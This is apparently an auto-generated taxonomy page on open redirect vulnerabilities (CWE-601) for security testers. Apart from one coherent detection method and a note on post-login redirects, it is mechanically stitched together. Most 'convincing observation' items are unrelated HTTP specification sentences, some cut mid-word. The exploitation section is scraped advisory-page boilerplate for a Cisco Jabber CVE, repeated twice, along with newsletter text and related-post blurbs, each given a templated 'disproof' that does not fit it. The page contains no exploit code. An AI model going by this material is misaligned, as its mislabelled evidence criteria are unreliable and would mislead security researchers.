<!-- GENERATED from db/wks.db — do not edit -->
# Open Redirect

## Definition

A redirect target is not constrained to a trusted destination.

- **CWE:** 601
- **OWASP:** A01:2021
- **Surface:** web
- **Aliases:** ["open redirect", "unvalidated redirect", "redirect uri validation"]

Canonical home for `open_redirect`. Rendered from `db/wks.db` by `tools/taxonomy/build_taxonomy.py` — edit the rows, not this file.

## Root Cause

Not yet researched.

## Preconditions

Not yet researched.

## Attack Surface

Surface: **web**.

The entry points and enabling conditions for this surface are enumerated under **Preconditions**; the observable signals are under **Detection**.

## Detection

**An open redirect is only present when user-supplied input reaches the destination of a redirect without validation, as distinct from any redirect that exists.**

Replay login, logout, return and language-switch endpoints with a decoy destination parameter and read the resulting Location header. The signal is a Location pointing at your controlled host in response to attacker input. A redirect that ignores the parameter, or that only ever targets fixed in-application routes, is not the vulnerability class even though a 302 is present.

*Disproof:* If no supplied parameter alters the Location host, or the destination is always a fixed internal route, there is no open redirect to pursue.

**A convincing observation for this class is: A server that receives an Expect field-value other than 100-continue MAY respond with a 417 (Expectation Failed) status code to indicate that the unexpected expectation cannot be met.**

Derived from open_redirect.auto.t.852c145c, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.852c145c) states the full boundary.

**A convincing observation for this class is: A server MUST generate a Content-Length field with a value of "0" if no payload body is to be sent in the response.**

Derived from open_redirect.auto.t.c6c732df, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.c6c732df) states the full boundary.

**A convincing observation for this class is: ELETE method is successfully applied, the origin server SHOULD send a 202 (Accepted) status code if the action will likely succeed but has not yet been enacted, a 204 (No Content) status code if the action has been enacted and no further information is to be supplied, or a 200 (OK) status code if the action has been enacted and the response message includes a representation describing the status**

Derived from open_redirect.auto.t.85a3f380, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.85a3f380) states the full boundary.

**A convincing observation for this class is: HEAD The HEAD method is identical to GET except that the server MUST NOT send a message body in the response (i.e., the response terminates at the end of the header section).**

Derived from open_redirect.auto.t.77f2d9a5, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.77f2d9a5) states the full boundary.

**A convincing observation for this class is: A server MUST generate a Content-Length field with a value of "0" if no payload body is to be sent in the response.**

Derived from open_redirect.auto.t.eca13d01, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.eca13d01) states the full boundary.

**A convincing observation for this class is: Redirection 3xx The 3xx (Redirection) class of status code indicates that further action needs to be taken by the user agent in order to fulfill the request.**

Derived from open_redirect.auto.t.57ed1a35, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.57ed1a35) states the full boundary.

**A convincing observation for this class is: Redirection to a different resource, identified by the Location field, that can represent an indirect response to the request, as in the 303 (See Other) status code.**

Derived from open_redirect.auto.t.64eea101, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.64eea101) states the full boundary.

**A convincing observation for this class is: For a response message, the following rules are applied in order until a match is found: If the request method is GET or HEAD and the response status code is 200 (OK) , 2**

Derived from open_redirect.auto.t.4ea28591, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.4ea28591) states the full boundary.

**A convincing observation for this class is: Redirection 3xx The 3xx (Redirection) class of status code indicates that further action needs to be taken by the user agent in order to fulfill the request.**

Derived from open_redirect.auto.t.44375ffe, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.44375ffe) states the full boundary.

**A convincing observation for this class is: For a response message, the following rules are applied in order until a match is found: If the request method is GET or HEAD and the response status code is 200 (OK) , 204 (No Content) , 206 (Partial Content) , or 304 (Not Modified) , the payload is a representation of the resource identified by the effective request URI ( Section 5**

Derived from open_redirect.auto.t.b3cebefd, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.b3cebefd) states the full boundary.

**A convincing observation for this class is: If the request method is GET or HEAD and the response status code is 203 (Non-Authoritative Information) , the payload is a potentially modified or enhanced representation of the target resource as provided by an intermediary.**

Derived from open_redirect.auto.t.1fb211f8, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.1fb211f8) states the full boundary.

**A convincing observation for this class is: that offers a choice of matching resources, each capable of representing the original request target, as in the 300 (Multiple Choices) status code.**

Derived from open_redirect.auto.t.3b706ea3, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.3b706ea3) states the full boundary.

**A convincing observation for this class is: Since the 205 status code implies that no additional content will be provided, a server MUST NOT generate a payload in a 205 response.**

Derived from open_redirect.auto.t.74923980, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.74923980) states the full boundary.

**The consequential open-redirect evidence is the post-authentication hop — the redirect that fires after a real login or token grant, not a bare redirect on an unauthenticated entry point, because the pre-auth redirect carries no session while the post-auth one lands the user on the attacker's page already carrying a fresh session.**

Mechanism: The consequential open-redirect evidence is the post-authentication hop — the redirect that fires after a real login or token grant, not a bare redirect on an unauthenticated entry point, because the pre-auth redirect carries no session while the post-auth one lands the user on the attacker's page already carrying a fresh session. How to apply it in the field: treat this as the evidence it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The claim is false when the pre-auth redirect is itself the finding — for example it feeds a `Referer`-based reset or a state parameter that the attacker can poison, or it is on a page that performs an authenticated action before redirecting — in which case the unauthenticated redirect is independently exploitable and its severity does not depend on a completed login.

*Disproof:* The claim is false when the pre-auth redirect is itself the finding — for example it feeds a `Referer`-based reset or a state parameter that the attacker can poison, or it is on a page that performs an authenticated action before redirecting — in which case the unauthenticated redirect is independently exploitable and its severity does not depend on a completed login.

**A convincing observation for this class is: A server MUST generate a Content-Length field with a value of "0" if no payload body is to be sent in the response.**

Derived from open_redirect.auto.t.f25977d9, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.f25977d9) states the full boundary.

**A convincing observation for this class is: HEAD The HEAD method is identical to GET except that the server MUST NOT send a message body in the response (i.e., the response terminates at the end of the header section).**

Derived from open_redirect.auto.t.7e606cb8, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (open_redirect.auto.t.7e606cb8) states the full boundary.

## Exploitation

**A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts.**

log 
 
 // 
 
 Advisories 
 
 // 
 
 Dec 21, 2016 
 
 

 
 
 
 Cisco Jabber Guest Server HTTP URL Redirection Vulnerability 
 
 
 
 By:
 Jake Miller, Security Researcher 
 
 
 

 
 
 
 
 
 
 

 
 
 
 
 
 
 Share 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
 

 

 
 Patch Date 
 Dec. 21, 2016 
 Vendor 
 Cisco 
 Systems Affected 
 Cisco Jabber Guest Server 
 Summary 
 A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts. 
 Vendor Status 
 We worked with Cisco to patch the affected application. A further write-up can be found here . 
 References 
 
 CVE-2016-9224 : A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts. 
 Cisco.com - Cisco Jabber Guest Server HTTP URL Redirection Vulnerability - 21Dec2016 
 
 Security Researcher

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated,”) does not occur under a test that isolates that control.

**CVE-2016-9224 : A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts.**

Patch Date 
 Dec. 21, 2016 
 Vendor 
 Cisco 
 Systems Affected 
 Cisco Jabber Guest Server 
 Summary 
 A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts. 
 Vendor Status 
 We worked with Cisco to patch the affected application. A further write-up can be found here . 
 References 
 
 CVE-2016-9224 : A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts. 
 Cisco.com - Cisco Jabber Guest Server HTTP URL Redirection Vulnerability - 21Dec2016 
 
 Security Researcher 
 
 Jake Miller of Bishop Fox 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 By
 Jake Miller
 
 Security Researcher 

 
 
 

 Jake Miller (OSCE, OSCP) is a Bishop Fox alumnus and former lead researcher. While at Bishop Fox, Jake was responsible for overseeing firm-wide research initiatives. He al

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“CVE-2016-9224 : A vulnerability in the Cisco Jabber Guest Server could allow an ”) does not occur under a test that isolates that control.

**Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defeats the private IP block.**

first to learn about latest tools, advisories, and findings. 
 
 
 
 
 
 

 
 
 Thank You! You have been subscribed. 
 
 
 
 
 
 

 
 
 

 
 

 
 
 
 
 
 
 
 
 
 
 
 
 
 Recommended Posts 
 
 You might be interested in these related posts. 
 
 
 
 
 
 
 
 
 
 
 
 Advisories Blog 
 Zilliz / Attu | 2.6.5 
 
 
 
 
 
 
 
 
 
 
 
 Two vulnerabilities in Zilliz Attu 2.6.5 chain into something serious. Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defeats the private IP block. Bishop Fox turned both into full Kubernetes namespace takeover in a cloud deployment. Update to 3.0.0 now. 
 
 
 
 
 Read Post
 
 
 
 
 

 
 

 
 
 
 
 
 
 Advisories Blog 
 Traefik | Version Through 3.7.11 
 
 
 
 
 
 
 
 
 
 
 
 Traefik's request read timeout is enabled by default and documented without exception, but it has never applied to HTTP/3. Bishop Fox confirmed the gap across four year

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defe".

**For example, a representation in the payload of a PUT request ( Section 4.3.4 ) represents the desired state of the target resource if the request is successfully applied, whereas a representation in the payload of a POST request ( Section 4.3.3 ) represents information to be processed by the target resource.**

.   Payload Semantics Some HTTP messages transfer a complete or partial representation as the message " payload ". In some cases, a payload might contain only the associated representation's header fields (e.g., responses to HEAD) or only some part(s) of the representation data (e.g., the 206 (Partial Content) status code). The purpose of a payload in a request is defined by the method semantics. For example, a representation in the payload of a PUT request ( Section 4.3.4 ) represents the desired state of the target resource if the request is successfully applied, whereas a representation in the payload of a POST request ( Section 4.3.3 ) represents information to be processed by the target resource. In a response, the payload's purpose is defined by both the request method and the response status code. For example, the payload of a 200 (OK) response to GET ( Section 4.3.1 ) represents the current state of the target resource , as observed at the time of the message origination date ( Section 7.1.1.2 ), whereas the payload of the same status code in a response to POST might represent either t

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“For example, a representation in the payload of a PUT request ( Section 4.3.4 ) ”) does not occur under a test that isolates that control.

**A sender that generates a message containing a payload body SHOULD generate a Content-Type header field in that message unless the intended media type of the enclosed representation is unknown to the sender.**

essage semantics. The indicated media type defines both the data format and how that data is intended to be processed by a recipient, within the scope of the received message semantics, after any content codings indicated by Content-Encoding are decoded. Content-Type = media-type 
 Media types are defined in Section 3.1.1.1 . An example of the field is Content-Type: text/html; charset=ISO-8859-4
 A sender that generates a message containing a payload body SHOULD generate a Content-Type header field in that message unless the intended media type of the enclosed representation is unknown to the sender. If a Content-Type header field is not present, the recipient MAY either assume a media type of "application/octet-stream" ( [RFC2046] , Section 4.5.1 ) or examine the data to determine its type. In practice, resource owners do not always properly configure their origin server to provide the correct Content-Type for a given representation, with the result that some clients will examine a payload's

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "A sender that generates a message containing a payload body SHOULD generate a Content-Type".

**HTTP message framing does not use the multipart boundary as an indicator of message body length, though it might be used by implementations that generate or process the payload.**

E provides for a number of "multipart" types — encapsulations of one or more representations within a single message body. All multipart types share a common syntax, as defined in Section 5.1.1 of [RFC2046] , and include a boundary parameter as part of the media type value. The message body is itself a protocol element; a sender MUST generate only CRLF to represent line breaks between body parts. HTTP message framing does not use the multipart boundary as an indicator of message body length, though it might be used by implementations that generate or process the payload. For example, the "multipart/form-data" type is often used for carrying form data in a request, as described in [RFC2388] , and the "multipart/byteranges" type is defined by this specification for use in some 206 (Partial Content) responses [RFC7233] . 3.1.1.5.   Content-Type The "Content-Type" header field indicates the media type of the associated representation: either the representation enclos

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“HTTP message framing does not use the multipart boundary as an indicator of mess”) does not occur under a test that isolates that control.

**A payload within a CONNECT request message has no defined semantics; sending a payload body on a CONNECT request might cause some existing implementations to reject the request.**

relaying spam email. Proxies that support CONNECT SHOULD restrict its use to a limited set of known ports or a configurable whitelist of safe request targets. A server MUST NOT send any Transfer-Encoding or Content-Length header fields in a 2xx (Successful) response to CONNECT. A client MUST ignore any Content-Length or Transfer-Encoding header fields received in a successful response to CONNECT. A payload within a CONNECT request message has no defined semantics; sending a payload body on a CONNECT request might cause some existing implementations to reject the request. Responses to the CONNECT method are not cacheable. 4.3.7.   OPTIONS The OPTIONS method requests information about the communication options available for the target resource, at either the origin server or an intervening intermediary. This method allows a client to determine the options and/or requirements associated with a resource, or the capabilities of a server, without implying a resource ac

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“A payload within a CONNECT request message has no defined semantics; sending a p”) does not occur under a test that isolates that control.

**If the response has a Content-Location header field and its field-value is a reference to the same URI as the effective request URI, the payload is a representation of the resource identified by the effective request URI.**

ent) , 206 (Partial Content) , or 304 (Not Modified) , the payload is a representation of the resource identified by the effective request URI ( Section 5.5 of [RFC7230] ). If the request method is GET or HEAD and the response status code is 203 (Non-Authoritative Information) , the payload is a potentially modified or enhanced representation of the target resource as provided by an intermediary. If the response has a Content-Location header field and its field-value is a reference to the same URI as the effective request URI, the payload is a representation of the resource identified by the effective request URI. If the response has a Content-Location header field and its field-value is a reference to a URI different from the effective request URI, then the sender asserts that the payload is a representation of the resource identified by the Content-Location field-value. However, such an assertion cannot be trusted unless it can be verified by other means (not defined by this specification). Otherwise, th

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“If the response has a Content-Location header field and its field-value is a ref”) does not occur under a test that isolates that control.

**A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts.**

log 
 
 // 
 
 Advisories 
 
 // 
 
 Dec 21, 2016 
 
 

 
 
 
 Cisco Jabber Guest Server HTTP URL Redirection Vulnerability 
 
 
 
 By:
 Jake Miller, Security Researcher 
 
 
 

 
 
 
 
 
 
 

 
 
 
 
 
 
 Share 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
 

 

 
 Patch Date 
 Dec. 21, 2016 
 Vendor 
 Cisco 
 Systems Affected 
 Cisco Jabber Guest Server 
 Summary 
 A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts. 
 Vendor Status 
 We worked with Cisco to patch the affected application. A further write-up can be found here . 
 References 
 
 CVE-2016-9224 : A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts. 
 Cisco.com - Cisco Jabber Guest Server HTTP URL Redirection Vulnerability - 21Dec2016 
 
 Security Researcher

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated,”) does not occur under a test that isolates that control.

**CVE-2016-9224 : A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts.**

Patch Date 
 Dec. 21, 2016 
 Vendor 
 Cisco 
 Systems Affected 
 Cisco Jabber Guest Server 
 Summary 
 A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts. 
 Vendor Status 
 We worked with Cisco to patch the affected application. A further write-up can be found here . 
 References 
 
 CVE-2016-9224 : A vulnerability in the Cisco Jabber Guest Server could allow an unauthenticated, remote attacker to initiate connections to arbitrary hosts. 
 Cisco.com - Cisco Jabber Guest Server HTTP URL Redirection Vulnerability - 21Dec2016 
 
 Security Researcher 
 
 Jake Miller of Bishop Fox 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 By
 Jake Miller
 
 Security Researcher 

 
 
 

 Jake Miller (OSCE, OSCP) is a Bishop Fox alumnus and former lead researcher. While at Bishop Fox, Jake was responsible for overseeing firm-wide research initiatives. He al

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“CVE-2016-9224 : A vulnerability in the Cisco Jabber Guest Server could allow an ”) does not occur under a test that isolates that control.

**A payload within a HEAD request message has no defined semantics; sending a payload body on a HEAD request might cause some existing implementations to reject the request.**

e same header fields in response to a HEAD request as it would have sent if the request had been a GET, except that the payload header fields ( Section 3.3 ) MAY be omitted. This method can be used for obtaining metadata about the selected representation without transferring the representation data and is often used for testing hypertext links for validity, accessibility, and recent modification. A payload within a HEAD request message has no defined semantics; sending a payload body on a HEAD request might cause some existing implementations to reject the request. The response to a HEAD request is cacheable; a cache MAY use it to satisfy subsequent HEAD requests unless otherwise indicated by the Cache-Control header field ( Section 5.2 of [RFC7234] ). A HEAD response might also have an effect on previously cached responses to GET; see Section 4.3.5 of [RFC7234] . 4.3.3.   POST The POST method requests that the target resource process the representation enc

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“A payload within a HEAD request message has no defined semantics; sending a payl”) does not occur under a test that isolates that control.

**Note: In HTTP/1.0, the status codes 301 (Moved Permanently) and 302 (Found) were defined for the first type of redirect ( [RFC1945] , Section 9.3 ).**

that offers a choice of matching resources, each capable of representing the original request target, as in the 300 (Multiple Choices) status code. Redirection to a different resource, identified by the Location field, that can represent an indirect response to the request, as in the 303 (See Other) status code. Redirection to a previously cached result, as in the 304 (Not Modified) status code. Note: In HTTP/1.0, the status codes 301 (Moved Permanently) and 302 (Found) were defined for the first type of redirect ( [RFC1945] , Section 9.3 ). Early user agents split on whether the method applied to the redirect target would be the same as the original request or would be rewritten as GET. Although HTTP originally defined the former semantics for 301 and 302 (to match its original implementation at CERN), and defined 303 (See Other) to match the latter semantics, prevailing practice gradually converged on the latter semantics for 301 a

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Note: In HTTP/1.0, the status codes 301 (Moved Permanently) and 302 (Found) were”) does not occur under a test that isolates that control.

**If a Location header field ( Section 7.1.2 ) is provided, the user agent MAY automatically redirect its request to the URI referenced by the Location field value, even if the specific status code is not understood.**

by including a Transfer-Encoding header field with a value of chunked and a message body consisting of a single chunk of zero-length; or, c) close the connection immediately after sending the blank line terminating the header section. 6.4.   Redirection 3xx The 3xx (Redirection) class of status code indicates that further action needs to be taken by the user agent in order to fulfill the request. If a Location header field ( Section 7.1.2 ) is provided, the user agent MAY automatically redirect its request to the URI referenced by the Location field value, even if the specific status code is not understood. Automatic redirection needs to done with care for methods not known to be safe , as defined in Section 4.2.1 , since the user might not wish to redirect an unsafe request. There are several types of redirects: Redirects that indicate the resource might be available at a different URI, as provided by the Location field, as in the status codes 301 (Moved Permanently) , 302 (Found) , and 307 (Tempor

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“If a Location header field ( Section 7.1.2 ) is provided, the user agent MAY aut”) does not occur under a test that isolates that control.

**Although this specification does not define any use for such a payload, future extensions to HTTP might use the OPTIONS body to make more detailed queries about the target resource.**

r field in an OPTIONS request to target a specific recipient in the request chain (see Section 5.1.2 ). A proxy MUST NOT generate a Max-Forwards header field while forwarding a request unless that request was received with a Max-Forwards field. A client that generates an OPTIONS request containing a payload body MUST send a valid Content-Type header field describing the representation media type. Although this specification does not define any use for such a payload, future extensions to HTTP might use the OPTIONS body to make more detailed queries about the target resource. Responses to the OPTIONS method are not cacheable. 4.3.8.   TRACE The TRACE method requests a remote, application-level loop-back of the request message. The final recipient of the request SHOULD reflect the message received, excluding some fields described below, back to the client as the message body of a 200 (OK) response with a Content-Type of "message/http" ( Section 8.3.1 of [RFC7230] ). Th

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Although this specification does not define any use for such a payload, future e”) does not occur under a test that isolates that control.

**In other words, if one were to perform a GET request on this URI at the time of this message's generation, then a 200 (OK) response would contain the same representation that is enclosed as payload in this message.**

the Content-Location field-value. However, such an assertion cannot be trusted unless it can be verified by other means (not defined by this specification). Otherwise, the payload is unidentified. 3.1.4.2.   Content-Location The "Content-Location" header field references a URI that can be used as an identifier for a specific resource corresponding to the representation in this message's payload. In other words, if one were to perform a GET request on this URI at the time of this message's generation, then a 200 (OK) response would contain the same representation that is enclosed as payload in this message. Content-Location = absolute-URI / partial-URI 
 The Content-Location value is not a replacement for the effective Request URI ( Section 5.5 of [RFC7230] ). It is representation metadata. It has the same syntax and semantics as the header field of the same name defined for MIME body parts in Section 4 of [RFC2557] . However, its appearance in an HTTP message has some special implications for HTTP

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“In other words, if one were to perform a GET request on this URI at the time of ”) does not occur under a test that isolates that control.

**For a request message: If the request has a Content-Location header field, then the sender asserts that the payload is a representation of the resource identified by the Content-Location field-value.**

only include "en". Content-Language MAY be applied to any media type — it is not limited to textual documents. 3.1.4.   Identification 3.1.4.1.   Identifying a Representation When a complete or partial representation is transferred in a message payload, it is often desirable for the sender to supply, or the recipient to determine, an identifier for a resource corresponding to that representation. For a request message: If the request has a Content-Location header field, then the sender asserts that the payload is a representation of the resource identified by the Content-Location field-value. However, such an assertion cannot be trusted unless it can be verified by other means (not defined by this specification). The information might still be useful for revision history links. Otherwise, the payload is unidentified. For a response message, the following rules are applied in order until a match is found: If the request method is GET or HEAD and the response status code is 200 (OK) , 2

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“For a request message: If the request has a Content-Location header field, then ”) does not occur under a test that isolates that control.

**Automatic redirection needs to done with care for methods not known to be safe , as defined in Section 4.2.1 , since the user might not wish to redirect an unsafe request.**

the header section. 6.4.   Redirection 3xx The 3xx (Redirection) class of status code indicates that further action needs to be taken by the user agent in order to fulfill the request. If a Location header field ( Section 7.1.2 ) is provided, the user agent MAY automatically redirect its request to the URI referenced by the Location field value, even if the specific status code is not understood. Automatic redirection needs to done with care for methods not known to be safe , as defined in Section 4.2.1 , since the user might not wish to redirect an unsafe request. There are several types of redirects: Redirects that indicate the resource might be available at a different URI, as provided by the Location field, as in the status codes 301 (Moved Permanently) , 302 (Found) , and 307 (Temporary Redirect) . Redirection that offers a choice of matching resources, each capable of representing the original request target, as in the 300 (Multiple Choices) status co

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Automatic redirection needs to done with care for methods not known to be safe ,”) does not occur under a test that isolates that control.

**Otherwise, the payload is unidentified. 3.1.4.2. Content-Location The "Content-Location" header field references a URI that can be used as an identifier for a specific resource corresponding to the representation in this message's payload.**

Otherwise, the payload is unidentified. 3.1.4.2. Content-Location The "Content-Location" header field references a URI that can be used as an identifier for a specific resource corresponding to the representation in this message's payload.

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Otherwise, the payload is unidentified. 3.1.4.2. Content-Location The "Content-L”) does not occur under a test that isolates that control.

**Early user agents split on whether the method applied to the redirect target would be the same as the original request or would be rewritten as GET.**

Redirection to a different resource, identified by the Location field, that can represent an indirect response to the request, as in the 303 (See Other) status code. Redirection to a previously cached result, as in the 304 (Not Modified) status code. Note: In HTTP/1.0, the status codes 301 (Moved Permanently) and 302 (Found) were defined for the first type of redirect ( [RFC1945] , Section 9.3 ). Early user agents split on whether the method applied to the redirect target would be the same as the original request or would be rewritten as GET. Although HTTP originally defined the former semantics for 301 and 302 (to match its original implementation at CERN), and defined 303 (See Other) to match the latter semantics, prevailing practice gradually converged on the latter semantics for 301 and 302 as well. The first revision of HTTP/1.1 added 307 (Temporary Redirect) to indicate the former semantics without being impacted by divergent pr

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Early user agents split on whether the method applied to the redirect target wou”) does not occur under a test that isolates that control.

